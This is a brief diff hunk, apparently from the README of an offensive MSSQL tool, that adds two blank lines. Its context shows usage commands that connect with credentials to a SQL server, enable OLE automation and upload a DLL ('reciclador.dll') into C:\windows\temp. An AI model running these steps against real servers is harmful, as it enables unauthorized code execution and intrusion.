@@ -19,3 +19,5 @@ python3 mssqlclient.py 'host/username:password@10.10.10.10' -start -reciclador '
 SQL> enable_ole
 SQL> upload reciclador.dll C:\windows\temp\reciclador.dll
 ```
+
+
